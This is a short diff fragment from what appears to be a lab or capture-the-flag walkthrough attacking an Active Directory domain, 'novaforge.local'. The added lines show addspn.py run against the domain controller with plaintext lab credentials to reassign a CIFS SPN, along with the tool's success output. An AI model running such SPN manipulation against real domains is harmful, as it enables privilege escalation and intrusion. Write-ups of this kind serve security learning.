@@ -1203,3 +1203,15 @@ DN: CN=STORAGE,CN=Computers,DC=novaforge,DC=local - STATUS: Read - READ TIME: 20
 ```
 
 So first ill remove the SPN
+
+```python
+python3 addspn.py -t 'DC$' --spn "cifs/storage.novaforge.local" -u 'novaforge.local\svc_it_admin' -p 'Password123!' "dc.novaforge.local"
+[-] Connecting to host...
+[-] Binding to host
+[+] Bind OK
+[+] Found modification target
+[+] SPN Modified successfully
+```
+
+Ill then add the SPN to the domain controller
+
